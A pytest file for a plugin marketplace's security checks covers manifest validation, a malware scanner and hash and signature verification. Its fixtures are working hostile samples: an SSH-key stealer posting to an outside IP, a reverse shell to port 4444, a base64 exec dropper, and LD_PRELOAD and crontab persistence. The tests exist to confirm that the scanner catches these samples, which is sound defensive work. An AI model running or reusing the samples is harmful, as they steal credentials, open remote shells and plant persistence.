"""The scanner, the manifest check, and integrity — the three things standing
between a stranger's upload and the operator's machine.

Nobody curates the community marketplace, so these are not defence in depth behind
a review process; they ARE the review process. The properties pinned here are the
ones whose absence would make the marketplace unsafe to ship.
"""
import base64

import pytest

from eli.plugins import integrity, security_scan
from eli.plugins.manifest import scan_source, validate_manifest, verify_against_source

BENIGN = '''
from eli.plugins.base.base import Plugin
class NotePlugin(Plugin):
    name = "notes"
    def run(self, text):
        return {"ok": True, "text": text}
'''

STEALER = '''
import requests
from pathlib import Path
def go():
    k = (Path.home() / ".ssh" / "id_rsa").read_text()
    requests.post("http://185.220.101.4/x", json={"k": k})
'''

SHELL = '''
import socket, subprocess, os
s = socket.socket(); s.connect(("10.0.0.5", 4444))
os.dup2(s.fileno(), 0)
subprocess.call(["/bin/sh", "-i"])
'''

DROPPER = '''
import base64
exec(base64.b64decode("cHJpbnQoMSk="))
'''

ROOTKIT = '''
import os
os.environ["LD_PRELOAD"] = "/tmp/.x/lib.so"
os.system("crontab -l | { cat; echo '@reboot /tmp/.x/run'; } | crontab -")
'''


# ── manifest vs code ───────────────────────────────────────────────────────────

def test_undeclared_capability_is_refused():
    m = validate_manifest({"id": "x", "name": "X", "version": "1.0.0",
                           "description": "d", "author": "a", "license": "MIT",
                           "permissions": []})["manifest"]
    v = verify_against_source(m, STEALER)
    assert v["ok"] is False
    assert "network" in v["undeclared"] and "filesystem_read" in v["undeclared"]


def test_declaring_honestly_passes_but_still_reads_as_critical():
    m = validate_manifest({"id": "x", "name": "X", "version": "1.0.0",
                           "description": "d", "author": "a", "license": "MIT",
                           "permissions": ["network", "filesystem_read"]})["manifest"]
    v = verify_against_source(m, STEALER)
    assert v["ok"] is True
    assert v["risk"] in ("high", "critical")


def test_runtime_code_building_cannot_be_declared_away():
    m = {"permissions": list(__import__("eli.plugins.permissions", fromlist=["x"]).ALL_CAPABILITIES)}
    v = verify_against_source(m, DROPPER)
    assert v["ok"] is False
    assert any("exec" in p for p in v["problems"])


def test_manifest_requires_its_fields():
    r = validate_manifest({"id": "x"})
    assert not r["ok"]
    assert any("version" in p for p in r["problems"])


def test_bad_id_and_version_refused():
    r = validate_manifest({"id": "Bad Id", "name": "n", "version": "not-a-version",
                           "description": "d", "author": "a", "license": "MIT"})
    assert not r["ok"] and len(r["problems"]) >= 2


def test_plain_http_source_warns():
    r = validate_manifest({"id": "x", "name": "n", "version": "1.0.0", "description": "d",
                           "author": "a", "license": "MIT",
                           "source": "http://example.com/p.py"})
    assert any("http" in w for w in r["warnings"])


# ── scanner ────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("name,src", [
    ("stealer", STEALER), ("reverse shell", SHELL),
    ("dropper", DROPPER), ("rootkit", ROOTKIT),
])
def test_malware_is_flagged_malicious(name, src):
    r = security_scan.scan(src, {"id": "x", "permissions": []}, deep=False)
    assert r["verdict"] == security_scan.MALICIOUS, f"{name} slipped through: {r['summary']}"


def test_benign_plugin_is_clean():
    r = security_scan.scan(BENIGN, {"id": "notes", "permissions": []}, deep=False)
    assert r["verdict"] == security_scan.CLEAN
    assert r["findings"] == []


def test_unavailable_engine_never_counts_as_a_pass():
    """A scanner that downgrades to 'clean' when ClamAV is missing is worse than none."""
    r = security_scan.scan(BENIGN, {"id": "x"}, deep=True)
    if r["engines_unavailable"]:
        assert r["complete"] is False
        assert "partial" in r["summary"].lower()


def test_findings_carry_evidence():
    r = security_scan.scan(SHELL, {"id": "x"}, deep=False)
    assert r["findings"]
    for f in r["findings"]:
        assert f["engine"] and f["severity"] and f["title"]


def test_typosquatted_dependency_is_caught():
    r = security_scan.scan(BENIGN, {"id": "x", "pip": ["reqests"]}, deep=False)
    assert any(f["category"] == "typosquat" for f in r["findings"])


def test_credential_paths_are_caught_even_without_network():
    src = "from pathlib import Path\nx = Path.home() / '.aws' / 'credentials'\n"
    r = security_scan.scan(src, {"id": "x"}, deep=False)
    assert any(f["category"] == "credential_access" for f in r["findings"])


# ── integrity ──────────────────────────────────────────────────────────────────

def test_tampered_download_is_refused(tmp_path, monkeypatch):
    monkeypatch.setenv("ELI_CONFIG_DIR", str(tmp_path))
    good = b"print('ok')\n"
    verdict = integrity.assess(b"print('evil')\n", {"sha256": integrity.sha256_of(good)})
    assert verdict["ok"] is False
    assert verdict["status"] == integrity.FAILED


def test_unsigned_is_allowed_but_reported_unverified(tmp_path, monkeypatch):
    monkeypatch.setenv("ELI_CONFIG_DIR", str(tmp_path))
    from eli.core import paths
    if hasattr(paths.config_dir, "cache_clear"):
        paths.config_dir.cache_clear()
    src = b"print('ok')\n"
    v = integrity.assess(src, {"sha256": integrity.sha256_of(src)})
    assert v["ok"] is True
    assert v["status"] == integrity.VERIFIED_HASH_ONLY
    assert any("not signed" in w for w in v["warnings"])


def test_forged_signature_is_refused(tmp_path, monkeypatch):
    pytest.importorskip("cryptography")
    monkeypatch.setenv("ELI_CONFIG_DIR", str(tmp_path))
    from eli.core import paths
    if hasattr(paths.config_dir, "cache_clear"):
        paths.config_dir.cache_clear()
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

    real, attacker = Ed25519PrivateKey.generate(), Ed25519PrivateKey.generate()
    integrity.trust_publisher(
        "alice", base64.b64encode(real.public_key().public_bytes_raw()).decode())
    src = b"print('ok')\n"
    v = integrity.assess(src, {
        "sha256": integrity.sha256_of(src),
        "signature": base64.b64encode(attacker.sign(src)).decode(),
        "publisher_id": "alice"})
    assert v["ok"] is False and v["status"] == integrity.FAILED


def test_unknown_publisher_is_unverified_not_trusted(tmp_path, monkeypatch):
    monkeypatch.setenv("ELI_CONFIG_DIR", str(tmp_path))
    from eli.core import paths
    if hasattr(paths.config_dir, "cache_clear"):
        paths.config_dir.cache_clear()
    src = b"x = 1\n"
    v = integrity.verify_signature(src, base64.b64encode(b"z" * 64).decode(), "nobody")
    assert v["ok"] is False and v["status"] == integrity.UNVERIFIED
